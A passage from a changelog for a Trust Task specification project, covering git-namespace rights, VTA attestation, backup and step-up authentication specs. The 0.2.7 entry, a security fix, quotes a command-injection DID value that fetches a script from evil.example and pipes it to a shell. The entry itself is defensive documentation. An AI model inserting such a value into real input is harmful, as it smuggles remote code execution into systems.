  round-trip. auth/revoke-session/0.2 has the same three-way `not:
  {anyOf: [...]}` shape and produced the same uninhabited nested type,
  though there it never broke a valid document (no shared field to
  drop).

  Only conformance example exercised extendBy alone, which is why this
  was never caught. Added role-only, expiresAt-only and role+expiresAt
  examples to auth/passkey/enroll/invite/update/0.1's spec.md, one per
  oneOf branch plus their combination.

  Fixed with a new preprocessing pass in trust-tasks-codegen,
  desugar_oneof_with_compound_not, which drops a oneOf combinator from
  the copy of the schema handed to typify whenever any branch's not is
  more than a single {"required": ["x"]} guard. Re-expressing the oneOf
  as anyOf (at least one) plus a pairwise not (no two at once) -
  oneOf's own JSON Schema definition - was tried first and does not
  help: typify applies the identical broken merge to a not wrapping
  anyOf/allOf regardless of which combinator carries it. The wire
  schema (SCHEMA_JSON / ValidatedPayload::validate_value, and the
  TypeScript/Go/Dart bindings, generated independently of typify) is
  captured before this pass runs and is unaffected, so the actual
  mutual-exclusion constraint is still enforced at runtime; only the
  Rust type for the two affected specs becomes fully permissive, matching
  what the other three languages already generate for this schema. A
  plain discriminated oneOf (every branch's not, if any, a single
  {"required": ["x"]}) is untouched and still renders as a clean Rust
  enum.

  Scanned every schema under specs/ for a oneOf/anyOf branch using not.
  Only these two combine it with oneOf; the rest (auth/revoke-session/0.1,
  vta/app-state/put/1.0, vta/app-state/put-many/1.0,
  vtc/registry/sync-jobs/retry/0.1, credential-exchange/issue/0.1, and a
  few uses of not outside any oneOf) were unaffected and are unchanged
  after regenerating.

  Regenerated all four bindings; only the two affected Rust modules
  changed.

## 0.3.6 — 2026-09-27


### Added

- **vta**: Trust Tasks for the VTA's REST-only health, restore-status, session-revocation and wrapping-key routes (#663)

* feat(vta): Trust Tasks for the VTA's REST-only health, session-revocation and wrapping-key routes

  Three Verifiable Trust Agent routes were reachable only over REST. Each
  gets a Trust Task, so an agent serves it identically over TSP, DIDComm
  and HTTPS.

  - vta/health/details/0.1 replaces GET /health/details: version,
    mediator, seal and at-rest encryption state, TEE status, TSP
    advertisement, and the restore the agent's state derives from.
    Public, anonymous, request proof OPTIONAL and response proof
    REQUIRED, like vta/attestation/status/0.1.
  - auth/revoke-session/0.2 replaces DELETE /auth/sessions?did=: adds a
    `subject` form ending every session of a subject the producer could
    withdraw the access of (a scoped administrator cannot reach an
    unrestricted one), answers a refusal with permissionDenied, and drops
    0.1's `notOwner`, which contradicted 0.1's own non-disclosure rule.
    Backwards-compatible: every 0.1 payload is a valid 0.2 payload.
  - keys/import-wrapping-key/0.1 replaces GET /keys/import/wrapping-key:
    a fresh, single-use, minutes-long key a producer seals a private key
    to for keys/import's privateKeySealed carrier over a transport that
    is not end to end. Returned as an Ed25519 did:key; the response proof
    is REQUIRED because the TLS terminator the task routes around could
    otherwise substitute its own key.

  Rust, TypeScript, Go and Dart bindings regenerated.

## 0.3.5 — 2026-09-27


### Added

- **did-management**: Trust Tasks for the DID hosting service's REST-only surface (#661)

* feat(did-management): Trust Tasks for the DID hosting service's REST-only surface

  Specs for every remote surface of affinidi-webvh-service that had none, so each can move onto the service's central Trust Task dispatch over TSP, DIDComm and HTTPS:

  - did-management: did/log, agent-name/resolve, domain/list, registry/list|get|check|purge-domain, stats/get|timeseries, server/config|info, identity/list|retire, and _shared/0.2 service-instance.
  - did-management/replica/domain: upsert, assign, unassign, purge (the control plane to edge hop, today sent on the admin URIs or unspecified).
  - webvh: sync/update 0.2 and sync/delete 0.2 (proof required, a disabled member, watchers as replicas), sync/batch 0.1, witness/sign and witness/key/create|list|delete.
  - auth: step-up/start (replaces the bespoke REST start/finish paths), and passkey/enroll/invite/list|update|revoke addressed by inviteId, never by token.

  Every task requires a proof except the public did-management/server/info read. Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.3.4 — 2026-09-27


### Added

- **git-ns**: Administrator reads — view 0.5, namespace/list and repo/list (#659)

* feat(git-ns): administrator reads — view 0.5, namespace/list and repo/list

  Three signed read tasks replace the bearer-authenticated administrator
  views VTCs served beside git-ns/view:

  - git-ns/view/0.5 adds scope: administrator (everything in the
    namespaces the caller administers, reasons included) and
    breakGlass: true (narrow to break-glass records). The response is
    0.4's.
  - git-ns/namespace/list/0.1 lists administered namespaces with admins,
    repository count, bridge, role map and forge status.
  - git-ns/repo/list/0.1 lists repositories in administered namespaces
    with owners, right counts, bootstrap, sync and the bridge's report.

  Proof REQUIRED on all three; no side effects. Authority is the
  community-administrator capability (every namespace) or a live explicit
  git.ns.admin (that namespace); each declares notAdministrator, answered
  alike for an unknown namespace and one the caller does not administer.

- **auth/passkey**: An administrator lists one member's passkeys (admin-list 0.1) (#658)

auth/passkey/list lists only the signer's own credentials and refuses a
  subject in the payload, so no task let an administrator see which step-up
  passkeys a member holds — and so which credentialId to hand to
  auth/passkey/revoke/start 0.2.

  auth/passkey/admin-list 0.1:

  - Proof REQUIRED: the administrator is the issuer. The subject and a purpose
    (session | stepUp, no default) are named in the payload, and are a request,
    never a grant: the consumer authorises the administrator over that subject
    from its own state.
  - Refusals, in order: notAdministrator (before the subject is looked at);
    subjectUnknown, also for a subject outside the administrator's authority,
    so the code is no oracle; purposeNotSupported; subjectNotMember.
  - The response is { subject, purpose, credentials }, each a ListedCredential
    of credentialId, deviceLabel, registeredAt, lastUsedAt and signCount — no
    key material, no public key, no attestation, additionalProperties false.
    The counter is disclosed to the administrator, as the operator who acts on
    a cloning signal.
  - sideEffects none: listing touches no counter and no last-used time.
  - Privacy: only administrators with authority over the subject; the family
    audits writes, not reads, and a consumer that audits administrative reads
    SHOULD include this one.

  Rust, TypeScript, Go and Dart bindings regenerated.

## 0.3.3 — 2026-09-26


### Added

- **vta/services**: Report, and update 1.1 with a mediator drain window (#656)

* feat(vta/services): report, and update 1.1 with a DIDComm drain window

  Two gaps that keep the VTA's service management on bespoke REST routes, found
  moving the SDK onto the Trust Task spine.

  - `vta/services/report/0.1` — per-mediator inbound counts and each sender's
    last-seen mediator over a window, so an operator can tell who is still on the
    old route before ending a drain. Today it exists only as a bearer-token REST
    route (`GET /mediators/report`). Operator-only, with a REQUIRED request proof:
    the response is a contact log of other parties' DIDs, which the recipient may
    release only to a signer it has decided is the agent's operator.
  - `vta/services/update/1.1` — adds an optional `drainTtlSecs` for `didcomm`.
    Replacing the mediator drains the old one, and 1.0 gave the operator no say in
    how long, so the agent could only apply its default. The REST route and the
    CLI (`services didcomm update --drain-ttl`) carry an operator-chosen window;
    without it here, moving the CLI to the Trust Task would silently drop the
    option. A 1.0 request is a valid 1.1 request; a value below the recipient's
    floor may be raised to it, and must be over a DIDComm-carried request.

  (`services/report` was pushed to #654 after it merged, so it did not ship there.)

  Rust, TypeScript, Go and Dart bindings regenerated; `npm run build` (strict
  Security & Privacy), `check-bindings` and the Rust tests (903) pass.

## 0.3.2 — 2026-09-26


### Added

- **vta/attestation**: Status, report and config-report as Trust Tasks (#654)

A VTA running in a TEE answers three attestation reads today only as
  unauthenticated REST routes (`GET /attestation/status`, `POST`/`GET
  /attestation/report`, `POST /attestation/config-report`), and a DIDComm
  protocol arm nothing sends to. Specifying them lets the agent serve them on its
  Trust Task spine over TSP, DIDComm and HTTPS alike, and retire both.

  - `vta/attestation/status/0.1` — which TEE the agent detected at boot. A claim,
    not evidence; it tells the verifier what to ask for.
  - `vta/attestation/report/0.1` — fresh evidence binding a verifier-chosen
    32-byte nonce and the agent's DID. The nonce is REQUIRED: there is no
    nonce-less (cached) form, because a report nobody asked for is one anybody can
    replay.
  - `vta/attestation/config-report/0.1` — fresh evidence binding the nonce and
    the SHA-384 of the canonical, secret-free view of the configuration the
    enclave booted, so a tenant can check operator-supplied settings (its KMS key)
    before onboarding.

  All three: request proof OPTIONAL (a verifier asks before it trusts the agent,
  often with no key the agent knows, and the nonce is what makes an answer its
  own), response proof REQUIRED (the agent's `authentication` signature ties its
  DID to the evidence it returns), no side effects, transient retention. Each
  spec states the verifier's checks — vendor root, measured image, the nonce
  inside the evidence, and the DID the evidence binds against the document's
  issuer.

  Rust, TypeScript, Go and Dart bindings regenerated; `npm run build`,
  `check-bindings` and the Rust tests pass.

## 0.3.1 — 2026-09-26


### Fixed

- **git-ns/view**: 0.4 requires a proof, as 0.1–0.3 do (#652)

#642 made `proof` REQUIRED on git-ns/view 0.1, 0.2 and 0.3, because the
  VTC answers the caller about their own namespaces, rights and linked
  accounts and must know from the document itself who the caller is.
  View 0.4 (#641) was written against the earlier text and landed after,
  still declaring `proof` RECOMMENDED with the old transport-integrity
  rationale.

  View 0.4 now declares `proof` REQUIRED with 0.3's rationale. Nothing
  else in the specification discussed the proof. Bindings regenerated for
  Rust, TypeScript, Go and Dart: `IS_PROOF_REQUIRED` is true for v0_4.

  No other version added by #635–#651 declares a weaker proof
  requirement than its predecessor.

## 0.3.0 — 2026-09-26


### Added

- **git-ns**: Separation of duties for elevated rights, with an audited break-glass (#641)

* feat(git-ns): separation of duties for elevated rights, with an audited break-glass

  An elevated git right (git.ns.admin, git.repo.create, git.repo.own) is now
  always granted by someone other than its recipient, and the one way to give
  oneself one is an explicit, justified, highly visible break-glass that another
  administrator ratifies or revokes.

  - git-ns/right/grant 0.3: fixed rule 7, separation of duties, refused with
    git-ns:selfGrantNotAllowed. It binds every task that records a right on the
    actor's own authority (drift/resolve adopt, repo/adopt, namespace/reseat);
    bind and repo/create are not self-grants. Rules 3 and 4 count only records
    with no expiry that are not unratified break-glass.
  - git-ns/right/break-glass 0.1 (new): self-grant of an elevated right the
    actor may already grant, or git.ns.admin on a headless namespace for a
    community administrator. Mandatory justification, destructive, immediate,
    no expiry, highest-severity audit, notice to every administrator, visible
    until ratified or revoked. Policy may disable, delay or tighten it, never
    quieten it.
  - git-ns/right/ratify 0.1 (new): another administrator clears the flag,
    bound to the breakGlass.at they read.
  - git-ns/right/break-glass-notice 0.1 (new): the VTC's signed push to every
    community administrator and namespace admin, for break-glass, ratified and
    revoked.
  - git-ns/right/revoke 0.3: any community administrator may revoke an
    unratified break-glass record; policy cannot refuse that.
  - git-ns/view 0.4: unratified break-glass records go to every administrator
    they concern, whatever else the caller may see.
  - git-ns/_shared 0.4: BreakGlass, RightRecord.breakGlass, ElevatedRight.

  Rust, TypeScript, Go and Dart bindings regenerated.

- **git-ns**: Drift/resolve 0.3 binds an adoption to the member it names (#640)

* feat(git-ns): drift/resolve 0.3 binds an adoption to the member it names

  A drift/resolve 0.2 adoption did not name who receives the right. The VTC
  resolved the item's forge account to whoever had linked it when the task
  ran, so an account unlinked and linked again, to someone else, between the
  resolver reading the item and signing granted a right, published to the
  Trust Registry, to a member the resolver never saw. The signed document
  said nothing otherwise: observed bounded which role an adoption records,
  nothing bounded to whom.

  drift/resolve 0.3 adds `subject`, the DID of the member the resolver read
  as linked to the account. It is required for adopt and absent for revert,
  refused as malformedRequest otherwise (as a missing `observed` is, and
  likewise stated in prose rather than a schema conditional). The VTC adopts
  only while the account is still linked to exactly that member, re-checked
  under the same exclusion as the write that records the right, and refuses
  otherwise with the new git-ns/drift/resolve:subjectChanged.

  Versioning. A 0.2 document is a 0.3 document with no `subject`: still a
  valid revert, now a malformed adopt. Required-for-one-action is not
  backwards-compatible, so this is a MINOR increment under the draft
  allowance of SPEC 5.2. A VTC serving older versions SHOULD NOT accept a
  0.1 or 0.2 adopt, since it cannot know whom that resolver meant, and SHOULD
  refuse one naming 0.3.

  git-ns/view still returns a member only their own account links, so a
  client that has only git-ns/view cannot adopt another member's role; the
  spec says so. Invalid examples cover a DID URL, shell metacharacters and a
  list as `subject`.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

- **git-ns**: Re-project roles on demand, and the bridge reports its role map (#639)

* feat(git-ns): re-project roles on demand, and the bridge reports its role map

  A bridge's role map (which forge role own, maintain and commit.sign get)
  is the community's to configure per bridge, forge, namespace and
  repository, but nothing told the VTC what map was in force, and a
  change reached a repository only at its next unrelated projection.

  - git-ns/bridge/event 0.3: a new event type, roleMapReported. The bridge
    reports, per namespace, its role map as the forge applies it (rounded
    onto the forge's ladder: `none` < `read` < `triage` < `write` <
    `maintain` < `admin`), each repository whose map differs (`repos`), and
    each repository whose roles it last projected under a different map
    (`stale`). Sent at start-up, on a map change and after bindCompleted.
    The map has no member for git.ns.admin: a namespace admin projects to
    no forge role whatever the configuration. The VTC refuses an unordered
    map, confines `repos` and `stale` to the namespace, uses the map
    wherever it shows or derives a forge role, and SHOULD re-project each
    stale repository. Everything else is restated unchanged from 0.2; the
    schema pins _shared/0.3, wire-identical for every event shape.

  - git-ns/roles/reproject 0.1 (new): a community administrator, or a
    namespace admin by explicit record, has the VTC send the complete
    desiredRoles of one repository, or of every active or orphaned
    repository in a namespace, again. No right changes and nothing is
    published; the audit record says who asked and why. Refused in manual
    mode (manualMode) and while the bridge has no access (noForgeAccess).

  - git-ns/drift/resolve 0.2 (draft, in place): the projected right of a
    role is the lowest right whose role in the bridge's reported map is
    that role; the default map without a report.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

- **vta/webvh/dids/keys**: Named key roles and per-role rotation for a VTA's DIDs (#638)

* feat(vta/webvh/dids/keys): named key roles and per-role rotation for a VTA's DIDs

  Adds the Trust Tasks every client uses to manage the key roles of the
  did:webvh identities a VTA holds keys for (its own, and those of the
  VTCs and VTNs provisioned on it), aligned with the VTI key-roles draft
  (dtgwg-vti-spec#42): attestation, operational, messaging and update.

- **git-ns/account/unlink**: A member unlinks their own forge account (#636)

* feat(git-ns/account/unlink): a member unlinks their own forge account

  git-ns/account/link said a binding lasts "until the member unlinks or
  leaves", but no task unlinked: the only way to drop an account was to
  link another on the same forge, or to leave the community.

- **git-ns**: Bridge/job 0.4 and namespace/reseat 0.3, a namespace admin gets no forge role (#635)

* feat(git-ns): bridge/job 0.4 and namespace/reseat 0.3 — a namespace admin gets no forge role

  A namespace admin exercises git.ns.admin through the VTC and its bridge,
  never through a forge role: the bridge does not make them an owner of the
  organisation and gives them no role on any repository for it.

  git-ns/bridge/job 0.4:
  - desiredRoles carries, per person, the highest right recorded in their
    own name on the repository (own, maintain or commit.sign there, or
    commit.sign on the namespace), never one held only because git.ns.admin
    implies it. A namespace admin with none is listed at git.ns.admin, which
    every adapter maps to no role, so the bridge takes off a role it manages
    that they still hold. An admin who is also a recorded owner is listed as
    the owner.
  - Each forge account appears in desiredRoles at most once.
  - repo is required for projectRoles: the namespace-level job, which only
    ever projected git.ns.admin as organisation owners, no longer exists.
  - removeAccounts may name an account listed at git.ns.admin.
  - A VTC must not send 0.4 to a bridge that has not shown it takes 0.4, and
    should read an unsupportedType or unsupportedVersion refusal as the
    bridge taking only earlier versions.

  git-ns/namespace/reseat 0.3: step 8 no longer queues a namespace-level
  forge projection. Wire-identical to 0.2.

  Earlier versions are unchanged. Both are draft, so the breaking changes
  ship as MINOR increments under the draft allowance of SPEC 5.2.



### Security

- **didcomm**: A consumer may require a proof over DIDComm (#642)

The DIDComm binding lets a producer omit `proof` because the envelope
  authenticates the sender. A consumer that authorizes on the sender's identity
  now MAY decline that allowance and require an in-band proof on every document
  it accepts over the binding, rejecting a document without one as
  `proofRequired` and one whose proof does not identify the transport sender as
  `identityMismatch`. A producer SHOULD include a proof on every document it
  sends over DIDComm so it is accepted either way.

  The tasks whose consumer authorizes or answers on the caller's identity alone
  now declare `proof` REQUIRED, so the identity rests on the document on every
  transport:

  - vtc/vetting/vetters/profile/0.1
  - vtc/vetting/vetters/resend/0.1
  - vtc/members/personhood/challenge/0.1
  - git-ns/view/0.1, 0.2 and 0.3
  - git-ns/account/link-status/0.1

  All are drafts, edited in place. Bindings regenerated for Rust, TS, Go and
  Dart.

- **proof**: Check a proof's verificationMethod against its proofPurpose (#637)

* security(proof)!: check a proof's verificationMethod against its proofPurpose

  The stock Verifier accepted a proof signed by any key listed under the
  issuer's authentication or assertionMethod, whatever proofPurpose the proof
  declared. It did not check that the verification method's controller was the
  issuer. W3C Data Integrity requires both, through Controlled Identifiers
  v1.0 §3.3.

  - New ProofPurpose type (assertionMethod, authentication,
    capabilityInvocation, capabilityDelegation). Parsing refuses keyAgreement
    and unknown values.
  - New ProofPurposeResolver trait resolves a verificationMethod for one
    purpose. CachedDidResolver implements it. It requires the resolved
    document's id and the method's controller to be the DID that names the
    method. It requires the method to be listed under the relationship the
    purpose names, by absolute DID URL, by a fragment relative to the
    document id, or embedded. DidKeyResolver implements it with did:key's
    implicit relationships: the key named `did:key:<id>#<id>` signs for all
    four purposes, and an X25519 did:key signs for none.
  - Verifier resolves through a ProofPurposeResolver, so every proof is
    checked against its own purpose.
  - New PurposeBound wraps a ProofPurposeResolver as an upstream
    VerificationMethodResolver bound to one proof's purpose. It is for
    callers of DataIntegrityProof::verify.
  - sign_trust_task and ProofExt::sign default to proofPurpose authentication.
    They refuse a purpose that names no signing relationship.
  - Resolver errors name the rule that failed. They carry no DID, document or
    key material.



### Specifications

- **device**: Register the keyExport capability (#643)

keys/export-secret/0.1 authorizes against "standing over the key's
  scope" and leaves the grant's shape to the implementation. Where it is a
  device capability there should be a registered value, as there is for
  roomPresent and roomOpen, so implementations do not each carry a private
  one. The VTA already gates export on it.

  keyExport (key-export in the 0.1 casing) is deliberately separate from
  sign: a producer that may ask the custodian to use a key loses that the
  moment its entitlement changes, while a producer that took the key keeps
  it after its authority is withdrawn. export-secret now names the value
  and says a sign grant is not a keyExport grant. The value is additive,
  so a consumer that does not recognise it ignores it.

  Bindings regenerated (Rust, TS, Go, Dart); no version bumps.

## 0.2.8 — 2026-09-24


### Added

- **backup**: A node-neutral backup and restore family (#633)

`vta/backup/*` is the agent's descriptor-based backup and restore: a slot,
  digests pre-committed before any byte moves, the bundle carried either as an
  HTTPS stream or chunk by chunk over the agent's own Trust Task transport, and a
  finalize step that previews before it replaces. Nothing in that transfer is
  specific to an agent, and a community node needs exactly the same thing for the
  same reason: a backup of any real node is too large for one document, and a
  node that bounds a document's size before checking its proof — as it must on a
  binding that authenticates no sender — cannot accept one that way.
  `vtc/backup/import/0.1`, which carries the whole envelope inline, is the case
  in point.

  This adds `backup/{initiate-export, get-chunk, complete-export,
  initiate-import, put-chunk, finalize-import, abort}/0.1`, derived from the
  latest `vta/backup/*` versions and made node-neutral:

  - The parties, prose and error-code slugs name a node rather than an agent.
  - What a backup contains is the node's to define. `finalize-import`'s
    response replaces the agent-specific `keyCount` / `aclCount` /
    `contextCount` / `auditCount` / `importedSecretCount` with one `counts` map
    keyed by the node's own record kinds — an agent's `keys`, `acl`, `contexts`,
    `audit`, `importedSecrets`; a community's backed-up keyspaces — still
    counts, never contents.
  - The transfer shapes (descriptor, chunk manifest, chunk data, bundle id) are
    referenced from `vta/_shared/0.1/backup-transfer` rather than copied. A copy
    with the node-neutral wording would have been a second definition that the
    TypeScript generator disambiguates by renaming the published `ChunkData`,
    `ChunkSize`, `ChunkManifest`, `ChunkedDescriptor` and `BundleDescriptor`
    exports — a break for every TS consumer, for no difference on the wire.
  - The "Changes from 1.0" history sections are dropped; a new 0.1 has no
    predecessor, and the abstract says where the family came from.

  `vta/backup/*` stays served while agents adopt this family, and
  `vtc/backup/{export,import}` remain for a node small enough to fit one
  document. Retiring the agent-specific versions is a later change.

  Bindings regenerated for Rust, TypeScript, Go and Dart; the only change to
  existing generated code is the new `backup` feature and index entries.



### Specifications

- **auth/step-up**: A step-up bound to one operation needs no session (#631)

`approve-response/0.3` introduced the bound approval — one that authorizes a
  single operation and elevates nothing, answered `recorded` — but
  `approve-request` still required a `sessionId`, and `approve-response` echoed
  one. So the only operations a step-up could be bound to were ones that arrived
  over a session.

  An operation that arrives as a signed Trust Task document has none: its
  authority is its proof. Binding the human's gesture to one of their sessions
  after the fact cannot say which, and a window opened on any of them is one a
  process holding the signer's key can spend on acts the human never saw — the
  same defect as a session elevation standing in for consent.

  - `approve-request/0.3`: `sessionId` is omitted for a step-up bound to an
    operation that arrived without a session, and a relying party MUST NOT fill
    it with a session it chose after the fact. A new `boundTo` names the bound
    operation — for a signed document, a digest of its type and payload salted
    with the challenge, since an unsalted digest over a short, predictable
    payload is a confirmation oracle. A new "Inline delivery" section lets a
    relying party with no push channel carry the request in the refusal of the
    operation it is for (`details.stepUpRequest`); it is authenticated by being
    the relying party's own reply, so a producer must not surface one received
    any other way, and it is for bound step-ups only. The four Security &
    Privacy sub-headings are added.
  - `approve-response/0.4`: `sessionId` is echoed exactly when the request
    carried one, and a response carrying one for a session-less step-up is
    refused (`subjectMismatch`), so a bound approval cannot be read as naming a
    session to elevate. The subject is compared with the subject bound to the
    pending step-up rather than with a session's.

  Both are backward-compatible minors: a required member became optional and an
  optional one was added. Motivated by the community node's signed-document
  step-up (OpenVTC/verifiable-trust-infrastructure#1713) and by
  trustoverip/dtgwg-vti-spec#40, which amends VTI-APV-003 to admit it.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.7 — 2026-09-24


### Added

- **git-ns**: Hold every DID to the W3C DID Core syntax (#629)

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
  anything without whitespace after the method: shell metacharacters,
  quotes, backticks, `/`, `?` and `#`. A security review found that
  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
  right's subject and later reached a copyable shell command in an admin
  UI.

  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
  `did:`, a lowercase method name, and a method-specific id of
  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
  octets, the last one non-empty. No path, query or fragment: every
  member typed `Did` names a party (subjects, owners, grantedBy, a
  transfer's `to`, a job's subjects), never a verification method. No
  other definition changes, and no DID-URL field in the family uses
  `Did`. The framework defines no DID pattern to reuse; issuer and
  recipient are unconstrained VIDs.

  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
  schema component to be a new component version, so _shared/0.1 and
  0.2 are untouched. Item 3 couples adoption to a new version of each
  consuming specification, and the in-place rule of 5.2 covers only
  re-pins with no wire effect, so each latest spec version that carries
  a `Did` gets a new version. They are all draft, so the breaking
  narrowing ships as a MINOR increment under the draft allowance of 5.2:

    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

  Each restates its predecessor with a "Changes from" section, pins
  _shared/0.3, and links to the newest versions of its siblings. The
  specs that carry no `Did` (account/*, bridge/event, bridge/result,
  namespace/bind, namespace/unbind) are unchanged.

  The six specs with a `Did` in the request gain invalid examples: shell
  metacharacters, whitespace, a `#` fragment and an uppercase method
  (and, for bridge/job, a bad `desiredRoles[].subject`).

  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
  exist in two shapes and take family/version-qualified names
  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
  still exports them under their own names.

## 0.2.6 — 2026-09-24


### Added

- **git-ns/bridge/event**: Detach on transfer and name reuse, confine events to their namespace (#627)

git-ns/bridge/event 0.2. The wire format is unchanged. What the VTC does
  with three kinds of event changes:

  - repoTransferred always detaches the repository and withdraws its
    rights, wherever `to` is -- another owner, another forge, or another
    namespace, even one the same VTC governs. Rights never move. 0.1
    handled a transfer into a bound namespace as a rename, which let a
    forge-side act hand the receiving namespace's admins owners and
    committers they never chose. The receiving namespace sees the
    repository as repoCreatedUnmanaged, and its admins adopt it and grant
    afresh. Renames within the namespace are unchanged.
  - repoCreatedUnmanaged at a governed name whose forge id differs from
    the recorded one detaches the old repository first (name reuse), so
    the newcomer inherits nothing.
  - Every resource an event names (resource, from, a rename's to, drift
    items) must lie inside the event's namespace, else permissionDenied.
    The one exception is a transfer's `to`: it says where the repository
    went, and nothing is done there.

  drift/resolve 0.1 and bridge/job 0.2 now link to event 0.2. Bindings
  regenerated for Rust, TypeScript, Go and Dart.

## 0.2.5 — 2026-09-24


### Added

- **git-ns**: Drift resolution, namespace reseat, linked accounts in view (#625)

Three follow-ups to the git-ns family. Released versions are untouched;
  every change is a new version folder or a new task.

  - git-ns/view 0.2: the response also carries `accounts`, the forge
    accounts linked to the caller's own DID (ForgeAccount + linkedAt),
    never another member's; narrowed to the resource's forge when
    `resource` is given. Required, empty when none. Everything else is
    restated unchanged from 0.1.

  - git-ns/drift/resolve 0.1 (new): an owner of a repository, explicit or
    implied (so namespace admins too), resolves one reported drift item.
    Drift items have no stable id -- they are recomputed and replaced
    wholesale by every bridge event -- so the item is selected by type,
    plus the account for the three role types (at most one role item per
    account per repository), plus an `observed` guard, required for adopt.
    `adopt` records the right the observed role projects to, evaluated
    exactly as git-ns/right/grant (fixed rules, policy, idempotence);
    refused with accountNotLinked when the account has no member, and
    notAdoptable / noMatchingRight where no right fits. `revert` sends the
    bridge the job that restores the projection.

  - git-ns/bridge/job 0.2: projectRoles gains `removeAccounts`. 0.1 only
    converges roles the bridge manages and reports other roles as drift
    without removing them, so it cannot revert a collaborator added on
    the forge. The rest of the revert table reuses 0.1 jobs.

  - git-ns/namespace/reseat 0.1 (new): a community administrator grants
    git.ns.admin on a headless namespace (no live, unexpired, member-held
    git.ns.admin record) to a current member, with a required audit
    statement. Destructive class; refused with notHeadless otherwise. It
    also states that expiring git.ns.admin records do not count toward
    the last-admin invariant. That rule lives here and is not a new
    right/grant version: 0.1 says nothing about expiring records, so no
    valid document changes meaning.

  - git-ns/_shared 0.2: adds DriftType, the value set a drift selector
    shares with DriftItem.type. DriftItem keeps its inline list so it is
    textually identical to 0.1. That keeps the TypeScript component
    hoisting additive: renaming SharedComponents.DriftItem would have
    been a break.

  The spec forbids declaring consent classes (SPEC 7.3 item 13), so the
  "elevated" impact of reverting an owner-level role is written as a
  consequence and as descriptive impact prose in drift/resolve.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.4 — 2026-09-23


### Fixed

- **git-ns/right/grant**: Publish the implied commit right of a namespace admin (#623)

A namespace admin implies ownership of every repository in the namespace,
  and so git.commit.sign on each, but the projection rule named only own and
  maintain records: an admin's commits would have failed every check. The
  VTC now publishes the admin's git.commit.sign on the namespace resource,
  and a bridge that sets up a check configures the namespace as its
  fallback resource so that record counts.

## 0.2.3 — 2026-09-23


### Added

- **git-ns**: Add the git namespaces specification family (#621)

* feat(git-ns): add the git namespaces specification family

  A VTC can say today that a DID may sign commits for an org or a repo, and
  nothing else about git: who owns a repository, who may create one, who may
  merge and who may grant commit rights all live on the forge, and drift from
  the VTC as soon as someone clicks a button. git-ns makes the VTC the source of
  truth for all of it. Rights are per resource, not per role; the Trust Registry
  is the published projection verifiers read, and the forge is the enforced one.

  Five rights, spelled as the TRQP actions the VTC publishes them under:
  git.ns.admin, git.repo.create, git.repo.own, git.repo.maintain and
  git.commit.sign. Resources are forge-qualified and lowercase
  (github.com/acme/widgets, codeberg.org/acme), so a right never crosses forges
  and a community can host where it likes.

  Member- and admin-facing tasks, addressed to the VTC:

  - git-ns/namespace/bind, git-ns/namespace/unbind
  - git-ns/repo/create, git-ns/repo/adopt, git-ns/repo/transfer,
    git-ns/repo/archive
  - git-ns/right/grant, git-ns/right/revoke
  - git-ns/view
  - git-ns/account/link, git-ns/account/link-status

  git-ns/right/grant carries the family's rights model: implied rights, the
  grant-authority table, and six fixed rules a VTC enforces in its own code
  before policy runs, which policy can narrow and never loosen: scope
  containment, no escalation, the last-owner invariant, a last-admin invariant,
  the members-only floor for namespace rights, and policy-may-only-narrow. Each
  refusal has its own error code, declared once at the family level (git-ns:*).

  VTC <-> bridge tasks, for the per-community service that holds the forge
  credentials and the forge adapters:

  - git-ns/bridge/job — seven convergent, forge-neutral job kinds
  - git-ns/bridge/result — exactly one per job, per-step outcomes
  - git-ns/bridge/event — nine forge-neutral event types plus drift

  Shared shapes (resources, namespaces, RepoSummary, RightRecord, drift) live in
  git-ns/_shared/0.1.

  Bindings regenerated for Rust, TypeScript, Go and Dart; conformance checks
  agree. trust-tasks-rs gains a git-ns feature, in all-specs.

## 0.2.2 — 2026-09-23


### Added

- **vtc/vetting/vetters/event-mode**: The exception to the constant drip (#620)

A vetter's ordinary rate is a few tokens a tick, whether or not they have
  vetted anyone. That is the right rate for ordinary weeks and the wrong one for
  a conference desk, and the answer is deliberately not a bigger drip under the
  same key: it is a separate token label for a named event, with its own rate,
  its own expiry, and a group of vetters large enough that a spend under it still
  hides one.

  This task carries the vetter's half of that, which is only ever a request. The
  approval is an act by someone else, through the community's own administrative
  surface, and the specification says why there is no Trust Task for it: a task
  the vetter could send is a task a vetter could be made to send.

  The response says where the request stands, and carries a group *count* rather
  than a group. Who else is at the event is the anonymity set, so the number is
  the most a member may be told — enough to tell "nobody has approved it" from
  "not enough people have asked", which are the two reasons a request waits.

- **vetting/attestation**: The four tasks hidden-vetter admission needs (#618)

* feat(vetting/attestation): the four tasks hidden-vetter admission needs

  A community can hide which of its vetters vetted an applicant: the vetter
  attests under a blind class credential, the applicant proves that k distinct
  holders of one attested it, and the community counts the proof with the rule
  it already counts named statements with. What was missing was the wire.

  Four specifications, and the split between them is the design:

  - vtc/vetting/vetters/pcs-root — a vetter enrols for a class label. The
    community checks its own records (a live vetter grant, no credential under
    this label yet, the identifier it was bound to) and signs a commitment it
    cannot open. Being named happens here, once per label, and nowhere else on
    the path.
  - vtc/vetting/vetters/pcs-tokens — the vetter draws its tick of attestation
    tokens, unconditionally and at a published rate. A draw that tracked demand
    would report activity, which is what the exchange exists to hide; the quota
    is the community's to enforce, never the asker's restraint.
  - vetting/attestation — vetter to applicant, carrying the facts of the session
    and no issuer. The delivering identity is deliberately NOT what makes it
    count, and a consumer is told not to record it beside the attestation: that
    would recreate, in the applicant's own store, the link the exchange removes.
  - vtc/vetting/pcs-challenge — the applicant asks the community for the
    single-use nonce its proof must bind. Without it a proof verifies as often
